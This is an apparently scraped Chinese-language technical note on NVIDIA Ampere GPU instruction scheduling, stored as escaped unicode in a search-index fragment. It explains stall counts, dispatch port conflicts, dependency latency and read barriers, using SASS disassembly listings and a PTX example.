<p>\u200b\u5982\u679c\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\u6ca1\u6709\u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u6324\u5360\u200b dispatch port\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53d1\u5c04\u200b\u4e00\u6761\u200b\uff0c\u200b\u6b64\u65f6\u200b stall count \u200b\u90fd\u200b\u662f\u200b 1\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*0010*/                   MOV R4, c[0x0][0x168] ;                   /* 0x00005a0000047a02 */\n[B------:R-:W-:-:S01]          /*0020*/                   IMAD.MOV.U32 R5, RZ, RZ, c[0x0][0x16c] ;  /* 0x00005b00ff057624 */\n[B------:R-:W-:-:S01]          /*0030*/                   MOV R2, c[0x0][0x160] ;                   /* 0x0000580000027a02 */\n[B------:R-:W-:-:S01]          /*0040*/                   IMAD.MOV.U32 R3, RZ, RZ, c[0x0][0x164] ;  /* 0x00005900ff037624 */\n[B------:R-:W-:-:S01]          /*0050*/                   MOV R6, c[0x0][0x170] ;                   /* 0x00005c0000067a02 */\n[B------:R-:W-:-:S01]          /*0060*/                   IMAD.MOV.U32 R7, RZ, RZ, c[0x0][0x174] ;  /* 0x00005d00ff077624 */\n</code></pre> <p>\u200b\u867d\u7136\u200b Ampere SM 8.0 \u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 16 \u200b\u4e2a\u200b INT32 \u200b\u548c\u200b 16 \u200b\u4e2a\u200b FP 32 \u200b\u5355\u5143\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u4e00\u6761\u200b IMAD \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u53d1\u5c04\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b\u4e0a\u9762\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\uff0cMOV \u200b\u6307\u4ee4\u200b\u548c\u200b IMAD \u200b\u6307\u4ee4\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b dispatch port\uff0c\u200b\u867d\u7136\u200b\u5b83\u4eec\u200b\u5404\u81ea\u200b\u90fd\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u6765\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u662f\u200b\u95f4\u9694\u200b\u5730\u200b\u53d1\u5c04\u200b\u4f7f\u5f97\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u53d1\u5c04\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC MOV dispatch port IMAD dispatch port 0 0010 0010 MOV R4 Idle 1 0020 0010 MOV R4 0020 IMAD.MOV.U32 R5 2 0030 0030 MOV R2 0020 IMAD.MOV.U32 R5 3 0040 0030 MOV R2 0040 IMAD.MOV.U32 R3 4 0050 0050 MOV R6 0040 IMAD.MOV.U32 R3 5 0060 0050 MOV R6 0060 IMAD.MOV.U32 R7 6 0070 Other insts 0060 IMAD.MOV.U32 R7 <p>\u200b\u800c\u200b\u5982\u679c\u200b\u662f\u200b\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u8d28\u91cf\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u963b\u585e\u200b dispatch port\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5927\u4e8e\u200b 1 \u200b\u7684\u200b stall count\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*0010*/                   IADD3 R1, R1, -0x1a0, RZ ;                                     /* 0xfffffe6001017810 */\n[B------:R-:W-:-:S01]          /*0020*/                   IMAD.MOV.U32 R2, RZ, RZ, c[0x0][0x160] ;                       /* 0x00005800ff027624 */\n[B------:R-:W-:-:S01]          /*0030*/                   ISETP.NE.AND P0, PT, RZ, c[0x0][0x160], PT ;                   /* 0x00005800ff007a0c */\n[B------:R-:W-:-:S02]          /*0040*/                   IMAD.MOV.U32 R0, RZ, RZ, c[0x0][0x18] ;                        /* 0x00000600ff007624 */\n[B------:R-:W-:-:S01]          /*0050*/                   IMAD.MOV.U32 R3, RZ, RZ, c[0x0][0x1c] ;                        /* 0x00000700ff037624 */\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b 0010 IADD3 \u200b\u548c\u200b 0020 IMAD \u200b\u4e4b\u95f4\u200b\u30010020 IMAD \u200b\u548c\u200b 0030 ISETP \u200b\u4e4b\u95f4\u200b\u30010030 ISETP \u200b\u548c\u200b 0040 IMAC \u200b\u4e4b\u95f4\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b dispatch port \u200b\u7684\u200b\u51b2\u7a81\u200b\u3002\u200b\u4f46\u662f\u200b IMAD \u200b\u548c\u200b IMAD \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\uff0c\u200b\u6240\u4ee5\u200b 0040 IMAD \u200b\u6307\u4ee4\u200b\u7684\u200b stall count \u200b\u662f\u200b 2\u3002\u200b\u6839\u636e\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u731c\u6d4b\u200b\uff0cIMAD \u200b\u5e76\u200b\u6ca1\u6709\u200b\u653e\u5728\u200b INT32 core \u200b\u4e2d\u200b\u6267\u884c\u200b\uff0c\u200b\u800c\u662f\u200b\u653e\u5230\u200b\u4e86\u200b FP32 \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6216\u8bb8\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e58\u6cd5\u5668\u200b\uff0c\u200b\u51cf\u5c11\u200b\u9762\u79ef\u200b\u3002\u200b\u5176\u4f59\u200b\u7684\u200b MOV\uff0cIADD3 \u200b\u548c\u200b ISETP \u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u662f\u200b\u5728\u200b INT32 core \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u3002\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e5f\u200b\u8bf4\u660e\u200b\u4e86\u200b IADD3 \u200b\u548c\u200b ISETP \u200b\u5927\u200b\u6982\u7387\u200b\u662f\u200b\u540c\u4e00\u4e2a\u200b dispatch port\uff1a</p> <pre><code>[B------:R-:W-:-:S02]          /*0080*/                   ISETP.NE.AND P0, PT, R2, 0x1, PT ;                             /* 0x000000010200780c */\n[B------:R-:W-:Y:S04]          /*0090*/                   IADD3 R4, P1, R1, c[0x0][0x20], RZ ;                           /* 0x0000080001047a10 */\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4ed4\u7ec6\u200b\u770b\u200b IMAD \u200b\u6307\u4ee4\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff08<code>IMAD.MOV.U32 R2, RZ, RZ, c[0x0][0x160]</code>\uff09\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5c31\u662f\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u200b\u884c\u4e3a\u200b\uff08<code>MOV R2, c[0x0][0x160]</code>\uff09\uff0c\u200b\u56e0\u4e3a\u200b RZ \u200b\u6052\u200b\u7b49\u4e8e\u96f6\u200b\u3002\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u7528\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u8bdd\u200b\uff0cMOV \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u548c\u200b IADD3 \u200b\u6216\u200b ISETP \u200b\u6307\u4ee4\u200b\u62a2\u200b dispatch port\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u628a\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u200b\u6548\u679c\u200b\uff0c\u200b\u7528\u200b IMAD \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u56e0\u4e3a\u200b IMAD \u200b\u6307\u4ee4\u200b\u4e0d\u4f1a\u200b\u548c\u200b IADD3 \u200b\u548c\u200b ISETP \u200b\u6307\u4ee4\u200b\u51fa\u73b0\u200b dispatch port \u200b\u51b2\u7a81\u200b\u3002IMAD \u200b\u5728\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4e2d\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5b9e\u73b0\u200b MOV \u200b\u7684\u200b\u8bed\u4e49\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u7528\u200b\u542f\u7528\u200b\u4e58\u6cd5\u5668\u200b\u548c\u200b\u52a0\u6cd5\u5668\u200b\u4e86\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u9891\u7e41\u200b\u7684\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u62c6\u200b\u5206\u6210\u200b IADD \u200b\u548c\u200b IMAD\uff0c\u200b\u653e\u5230\u200b\u4e24\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u4e2d\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b IMAD \u200b\u9000\u5316\u200b\u6210\u200b\u4e86\u200b \\(1 * b + c\\)\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u89c2\u5bdf\u200b\uff0c\u200b\u6765\u81ea\u200b\u4e8e\u200b GPGPU \u200b\u4e2d\u200b\u4e00\u4e9b\u200b\u95ee\u9898\u200b\u7684\u200b\u7406\u89e3\u200b\u4e0e\u200b\u601d\u8003\u200b\uff083\uff09- \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u541e\u5410\u200b\u4e0e\u200b\u6307\u4ee4\u96c6\u200b\u8bbe\u8ba1\u200b\u3002</p> <p>\u200b\u518d\u200b\u770b\u200b\u4e0b\u9762\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u770b\u770b\u200b\u5982\u4f55\u200b\u7528\u200b stall count \u200b\u4fdd\u8bc1\u200b\u5199\u540e\u200b\u8bfb\u200b\uff08RAW\uff09\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u524d\u9762\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u7684\u200b\u6b63\u786e\u200b\u7ed3\u679c\u200b\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*01c0*/                   IMAD.X R4, RZ, RZ, c[0x0][0x54], P0 ;                          /* 0x00001500ff047624 */\n[B------:R-:W-:Y:S04]          /*01d0*/                   ISETP.GE.U32.AND P0, PT, R0, c[0x0][0x50], PT ;                /* 0x0000140000007a0c */\n[B------:R-:W-:Y:S04]          /*01e0*/                   ISETP.GE.U32.AND.EX P1, PT, R3, R4, PT, P1 ;                   /* 0x000000040300720c */\n[B------:R-:W-:-:S02]          /*01f0*/                   ISETP.GE.U32.AND.EX P3, PT, R3.reuse, c[0x0][0x54], !P1, P0 ;  /* 0x0000150003007a0c */\n[B------:R-:W-:Y:S13]          /*0200*/                   ISETP.GE.U32.AND.EX P0, PT, R3, c[0x0][0x54], !P1, P0 ;        /* 0x0000150003007a0c */\n</code></pre> <p>\u200b\u9996\u5148\u200b\u662f\u200b 01c0 \u200b\u7684\u200b IMAD \u200b\u8d28\u91cf\u200b\uff0c\u200b\u5b83\u200b\u5199\u5165\u200b R4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4f1a\u200b\u88ab\u200b 01e0 ISETP \u200b\u6307\u4ee4\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u5199\u540e\u200b\u8bfb\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u8003\u8651\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u90a3\u4e48\u200b 01d0 ISETP \u200b\u548c\u200b 01e0 ISETP \u200b\u5e94\u8be5\u200b\u53ea\u200b\u9700\u8981\u200b\u76f8\u9694\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u987a\u5229\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b 01d0 ISETP \u200b\u7684\u200b stall count \u200b\u8bbe\u7f6e\u200b\u6210\u200b\u4e86\u200b 4\u3002\u200b\u8fd9\u4f1a\u200b\u6709\u200b\u4ec0\u4e48\u200b\u6548\u679c\u200b\u5462\u200b\uff1f\u200b\u5982\u679c\u200b\u628a\u200b\u5468\u671f\u200b\u753b\u200b\u51fa\u6765\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC ISETP dispatch port IMAD dispatch port 0 01c0 Idle 01c0 IMAD.X R4 1 01d0 01d0 ISETP P0 01c0 IMAD.X R4 2 01d0 01d0 ISETP P0 Idle 3 01d0 Idle Idle 4 01d0 Idle Idle 5 01e0 01e0 ISETP P1 Idle 6 01e0 01e0 ISETP P1 Idle 7 01e0 Idle Idle 8 01e0 Idle Idle <p>\u200b\u6211\u4eec\u200b\u4e0d\u200b\u77e5\u9053\u200b IMAD.X \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u731c\u6d4b\u200b\uff0c\u200b\u5982\u679c\u200b 01d0 ISETP \u200b\u7684\u200b stall count \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 2\uff0c\u200b\u867d\u7136\u200b 01e0 ISETP \u200b\u8d28\u91cf\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u662f\u200b\u5f53\u200b\u4ed6\u200b\u8bfb\u53d6\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b IMAD.X \u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u5e76\u4e14\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u200b\u56de\u5230\u200b\u5bc4\u5b58\u5668\u200b\u3002</p> <p>\u200b\u800c\u200b\u540e\u9762\u200b\u7684\u200b 01f0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b\u4e86\u200b P1 \u200b\u548c\u200b P0\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 01d0 ISETP \u200b\u548c\u200b 01e0 ISETP \u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5199\u200b\u540e\u200b\u8bfb\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3002\u200b\u56e0\u6b64\u200b 01e0 ISETP \u200b\u4e5f\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u6bd4\u200b 2 \u200b\u5927\u200b\u7684\u200b stall count\uff1a4\u3002\u200b\u5230\u200b 0200 ISETP \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u200b\u867d\u7136\u200b\u4e5f\u200b\u4f9d\u8d56\u200b P1 \u200b\u548c\u200b P0\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u7b49\u5f85\u200b\u4e86\u200b\u8db3\u591f\u200b\u7684\u200b\u5468\u671f\u200b\u6570\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b stall count \u200b\u4e86\u200b\uff0c\u200b\u56e0\u6b64\u200b 01f0 \u200b\u7684\u200b stall count \u200b\u5c31\u662f\u200b 2\u3002\u200b\u628a\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u5199\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5982\u4e0b\u200b\u8868\u683c\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC ISETP dispatch port IMAD dispatch port 0 01c0 Idle 01c0 IMAD.X R4 1 01d0 01d0 ISETP P0 01c0 IMAD.X R4 2 01d0 01d0 ISETP P0 Idle 3 01d0 Idle Idle 4 01d0 Idle Idle 5 01e0 01e0 ISETP P1 Idle 6 01e0 01e0 ISETP P1 Idle 7 01e0 Idle Idle 8 01e0 Idle Idle 9 01f0 01f0 ISETP P3 Idle 10 01f0 01f0 ISETP P3 Idle 11 0200 0200 ISETP P0 Idle 12 0200 0200 ISETP P0 Idle <p>01f0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b 01e0 ISETP\uff0c\u200b\u6240\u4ee5\u200b\u53d1\u5c04\u200b\u6bd4\u200b\u5b83\u200b\u665a\u200b\u4e86\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff1b01e0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b 01c0 IMAD.X\uff0c\u200b\u6240\u4ee5\u200b\u53d1\u5c04\u200b\u6bd4\u200b\u5b83\u200b\u665a\u200b\u4e86\u200b 5 \u200b\u4e2a\u200b\u5468\u671f\u200b\u3002\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u610f\u5473\u7740\u200b\uff0cIMAD.X \u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u6bd4\u200b ISETP \u200b\u8981\u200b\u591a\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u6d4b\u8bd5\u200b\u8fde\u7eed\u200b\u76f8\u540c\u200b\u6307\u4ee4\u200b\u7684\u200b stall count\uff0c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b PTX \u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff1a</p> <pre><code>    mul.rn.f32  %f2, %f1, %f0;\n    mul.rn.f32  %f3, %f2, %f0;\n    mul.rn.f32  %f4, %f3, %f0;\n    mul.rn.f32  %f5, %f4, %f0;\n    mul.rn.f32  %f6, %f5, %f0;\n    mul.rn.f32  %f7, %f6, %f0;\n    mul.rn.f32  %f8, %f7, %f0;\n    mul.rn.f32  %f9, %f8, %f0;\n    mul.rn.f32  %f10, %f9, %f0;\n    mul.rn.f32  %f11, %f10, %f0;\n    mul.rn.f32  %f1, %f11, %f0;\n    mul.rn.f32  %f2, %f1, %f0;\n    mul.rn.f32  %f3, %f2, %f0;\n    mul.rn.f32  %f4, %f3, %f0;\n    mul.rn.f32  %f5, %f4, %f0;\n    mul.rn.f32  %f6, %f5, %f0;\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u903c\u8feb\u200b ptxas \u200b\u751f\u6210\u200b\u8fde\u7eed\u200b\u7684\u200b FMUL \u200b\u6307\u4ee4\u200b\uff1a</p> <pre><code>[B------:R-:W-:Y:S04]          /*0050*/                   FMUL R0, R0, c[0x0][0x164] ;    /* 0x0000590000007a20 */\n[B------:R-:W-:Y:S04]          /*0060*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0070*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0080*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0090*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*00a0*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fde\u7eed\u200b\u7684\u200b FMUL \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b stall count \u200b\u90fd\u200b\u662f\u200b 4\u3002SM 8.0 \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 16 \u200b\u4e2a\u200b FP32 core\u3002\u200b\u5982\u679c\u200b\u628a\u200b dispatch \u200b\u8fc7\u7a0b\u200b\u5199\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5c31\u662f\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC FMUL dispatch port 0 0050 0050 FMUL 1 0050 0050 FMUL 2 0060 Idle 3 0060 Idle 4 0060 0060 FMUL 5 0060 0060 FMUL <p>\u200b\u7531\u4e8e\u200b 0060 FMUL \u200b\u4f9d\u8d56\u200b 0050 FMUL \u200b\u7684\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u8bf4\u660e\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u5c31\u662f\u200b\u8fde\u7eed\u200b FMUL \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u5728\u200b CUDA C Programming Guide \u200b\u5f97\u5230\u200b\u4e86\u200b\u5370\u8bc1\u200b\uff1a</p> <pre><code>If all input operands are registers, latency is caused by register dependencies,\ni.e., some of the input operands are written by some previous instruction(s)\nwhose execution has not completed yet. In this case, the latency is equal to the\nexecution time of the previous instruction and the warp schedulers must schedule\ninstructions of other warps during that time. Execution time varies depending on\nthe instruction. On devices of compute capability 7.x, for most arithmetic\ninstructions, it is typically 4 clock cycles. This means that 16 active warps\nper multiprocessor (4 cycles, 4 warp schedulers) are required to hide arithmetic\ninstruction latencies (assuming that warps execute instructions with maximum\nthroughput, otherwise fewer warps are needed). If the individual warps exhibit\ninstruction-level parallelism, i.e. have multiple independent instructions in\ntheir instruction stream, fewer warps are needed because multiple independent\ninstructions from a single warp can be issued back to back.\n</code></pre> <p>\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u67e5\u200b\u5230\u200b\u4e00\u4e9b\u200b\u6d4b\u8bd5\u200b\u6307\u4ee4\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u6587\u7ae0\u200b\uff0c\u200b\u4f8b\u5982\u200b https://arxiv.org/pdf/1905.08778.pdf \u200b\u548c\u200b https://arxiv.org/pdf/1804.06826.pdf\u3002</p>"},{"location":"hardware/gpgpu.html#dependency-barrier","title":"Dependency Barrier","text":"<p>Dependency Barrier \u200b\u4e3b\u8981\u200b\u662f\u200b\u7528\u6765\u200b\u89e3\u51b3\u200b\u4f9d\u8d56\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0cTuring \u200b\u7b49\u200b\u67b6\u6784\u200b\uff0c\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u662f\u200b\u5148\u200b\u8fdb\u5165\u200b\u5230\u200b MIO Queue\uff0c\u200b\u7136\u540e\u200b\u5230\u8fbe\u200b SM \u200b\u5171\u4eab\u200b\u7684\u200b MIO \u200b\u5355\u5143\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b MIO \u200b\u8981\u200b\u6267\u884c\u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u4ece\u200b PB \u200b\u5185\u90e8\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u56e0\u6b64\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5bc4\u5b58\u5668\u200b\u5ef6\u8fdf\u200b\u8bfb\u53d6\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u50cf\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\u5728\u200b\u53d1\u5c04\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f88\u5feb\u200b\u5c31\u200b\u4f1a\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u3002\u200b\u90a3\u4e48\u200b\u95ee\u9898\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u7684\u200b\u6e90\u200b\u5bc4\u5b58\u5668\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u5408\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u8bfb\u540e\u200b\u5199\u200b\uff08WAR\uff09\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ca\u65f6\u200b\u5199\u200b\u7684\u200b\u6307\u4ee4\u200b\u5728\u200b\u540e\u9762\u200b\u624d\u200b\u4f1a\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u4f9d\u7136\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u4e4b\u524d\u200b\u53d1\u5c04\u200b\u5e76\u200b\u4fee\u6539\u200b\u4e86\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u62ff\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u4e86\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u9488\u5bf9\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b read barrier\uff0c\u200b\u5982\u200b\uff1a</p> <pre><code>[B------:R0:W-:-:S09]          /*0060*/                   STL [R1], R2 ;                                                 /* 0x0000000201007387 */\n/* snip */\n[B0-----:R-:W-:-:S01]          /*0170*/                   IMAD.MOV.U32 R2, RZ, RZ, R0 ;                                  /* 0x000000ffff027224 */\n</code></pre> <p>0060 STL \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\u4e86\u200b read barrier 0\uff0c0170 IMAD \u200b\u6307\u4ee4\u200b\u6807\u8bb0\u200b\u4e86\u200b\u4f1a\u200b\u7b49\u5f85\u200b barrier 0\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0060 STL \u200b\u6307\u4ee4\u200b\u5b8c\u6210\u200b\u4e86\u200b\u5b83\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b R2 \u200b\u7684\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5141\u8bb8\u200b 0170 IMAD \u200b\u6307\u4ee4\u200b\u53bb\u200b\u5199\u5165\u200b R2 \u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ea6\u675f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7b80\u5316\u200b\u4e3a\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0060 STL \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5141\u8bb8\u200b\u53d1\u5c04\u200b 0170 IMAD \u200b\u6307\u4ee4\u200b\u3002</p> 